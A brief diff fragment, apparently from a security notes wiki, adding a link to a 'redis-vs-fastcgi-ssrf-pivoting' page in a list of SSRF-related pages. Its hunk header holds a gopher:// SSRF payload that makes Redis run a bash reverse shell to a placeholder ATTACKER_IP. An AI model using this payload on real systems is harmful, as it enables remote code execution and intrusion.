@@ -58,3 +58,4 @@ gopher://redis:6379/_EVAL "os.execute('/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT
 - [[performance monitor]]
 - [[fastcgi-ssrf-exploitation]]
 - [[wordpress-performance-monitor]]
+- [[redis-vs-fastcgi-ssrf-pivoting]]
